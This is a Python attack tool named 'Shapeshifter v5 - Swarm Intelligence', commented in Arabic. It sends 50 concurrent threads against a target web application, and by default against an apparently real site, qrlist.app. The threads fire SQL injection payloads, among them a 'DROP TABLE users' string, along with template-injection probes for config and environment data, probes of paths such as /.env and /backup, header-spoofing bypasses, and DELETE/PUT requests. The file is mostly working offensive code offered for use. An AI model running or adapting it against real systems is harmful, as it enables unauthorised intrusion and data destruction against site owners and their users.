#!/usr/bin/env python3
"""
🐝 Shapeshifter v5 - Swarm Intelligence
50 خبيراً يشتغلون معاً
"""
import requests, sys, json, os, re, random, time, threading
from datetime import datetime
from urllib.parse import urlparse

class SwarmAgent:
    """خبير واحد في السرب"""
    def __init__(self, agent_id, target, shared_memory):
        self.id = agent_id
        self.target = target
        self.memory = shared_memory
        self.found = None
        self.session = requests.Session()
    
    def run(self):
        """الخبير يبدأ العمل"""
        attacks = [
            self.try_sqli,
            self.try_ssti,
            self.try_path,
            self.try_header,
            self.try_method,
        ]
        
        random.shuffle(attacks)
        for attack in attacks:
            if self.found:
                break
            try:
                attack()
            except:
                pass
    
    def try_sqli(self):
        """خبير SQLi"""
        payloads = [
            "' OR '1'='1", "admin'--", "1' OR 1=1--",
            "' UNION SELECT NULL--", "'; DROP TABLE users;--"
        ]
        for p in payloads:
            r = self.session.get(f"{self.target}/api/stores?q={p}", timeout=3)
            if "error" in r.text.lower() or "sql" in r.text.lower():
                self.memory.append({"agent":self.id,"type":"SQLi","payload":p})
                self.found = p
                break
    
    def try_ssti(self):
        """خبير SSTI"""
        payloads = ["{{7*7}}", "${7*7}", "{{config}}", "{{env}}"]
        for p in payloads:
            r = self.session.get(f"{self.target}/api/stores?q={p}", timeout=3)
            if "49" in r.text or "config" in r.text.lower():
                self.memory.append({"agent":self.id,"type":"SSTI","payload":p})
                self.found = p
                break
    
    def try_path(self):
        """خبير مسارات"""
        paths = ["/admin", "/login", "/api", "/graphql", "/.env", "/backup"]
        for p in paths:
            r = self.session.get(f"{self.target}{p}", timeout=3, allow_redirects=False)
            if r.status_code in [200, 403]:
                self.memory.append({"agent":self.id,"type":"Path","path":p,"status":r.status_code})
    
    def try_header(self):
        """خبير Headers"""
        headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "localhost",
            "X-Original-URL": "/admin",
        }
        for key, value in headers.items():
            r = self.session.get(self.target, headers={key:value}, timeout=3)
            if r.status_code != 403:
                self.memory.append({"agent":self.id,"type":"Header","header":key})
    
    def try_method(self):
        """خبير Methods"""
        for method in ["POST", "PUT", "PATCH", "DELETE"]:
            r = self.session.request(method, f"{self.target}/api/stores", timeout=3)
            if r.status_code not in [405, 501]:
                self.memory.append({"agent":self.id,"type":"Method","method":method,"status":r.status_code})

class SwarmIntelligence:
    def __init__(self, target, swarm_size=50):
        self.target = target
        self.swarm_size = swarm_size
        self.shared_memory = []  # ذاكرة مشتركة
        self.start_time = time.time()
    
    def log(self, msg): print(f"[🐝] {msg}")
    
    def run(self):
        self.log(f"🐝 Swarm Intelligence: {self.target}")
        self.log(f"   🐝 {self.swarm_size} خبراء")
        self.log("═" * 60)
        
        # إطلاق السرب
        agents = [SwarmAgent(i, self.target, self.shared_memory) for i in range(self.swarm_size)]
        threads = [threading.Thread(target=agent.run) for agent in agents]
        
        for t in threads:
            t.start()
        
        for t in threads:
            t.join(timeout=10)
        
        elapsed = time.time() - self.start_time
        
        # تحليل النتائج
        findings = {}
        for mem in self.shared_memory:
            key = mem["type"]
            if key not in findings:
                findings[key] = 0
            findings[key] += 1
        
        self.log(f"\n⏱️ {elapsed:.1f}s")
        self.log(f"📊 {len(self.shared_memory)} اكتشاف")
        
        for key, count in findings.items():
            self.log(f"   {key}: {count}")
        
        # حفظ
        os.makedirs("logs/swarm", exist_ok=True)
        fname = f"logs/swarm/{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"swarm":self.swarm_size,"time":elapsed,"findings":findings,"memory":self.shared_memory}, f, indent=2)
        self.log(f"📁 {fname}")
        
        return findings

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    SwarmIntelligence(target, 50).run()
